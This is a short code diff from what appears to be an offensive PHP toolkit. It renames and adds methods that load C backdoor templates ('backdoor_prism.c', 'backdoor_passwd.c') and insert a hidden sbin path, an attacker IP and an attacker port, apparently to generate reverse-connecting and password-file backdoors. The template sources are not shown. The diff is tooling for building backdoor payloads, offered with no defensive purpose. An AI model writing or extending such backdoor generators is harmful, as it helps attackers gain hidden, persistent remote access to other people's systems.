@@ -37,12 +37,19 @@ class com4code extends com4dot {
         return $rev_id;
     }
  
-    public function backdoor8c2tcp2($sbin_path_hidden,$attacker_ip,$attacker_port){
+    public function backdoor8c2tcp2prism($sbin_path_hidden,$attacker_ip,$attacker_port){
         $filename = "$this->dir_c/backdoor_prism.c";
         $rev_id = file_get_contents($filename);
         $rev_id = str_replace("%FILE%", $sbin_path_hidden, $rev_id);
         $rev_id = str_replace("%IP%", $attacker_ip, $rev_id);
         $rev_id = str_replace("%PORT%", $attacker_port, $rev_id);
+        return $rev_id;
+    }
+    
+    
+    public function backdoor8c2tcp2passwd(){
+        $filename = "$this->dir_c/backdoor_passwd.c";
+        $rev_id = file_get_contents($filename);
         return $rev_id;
     }
     
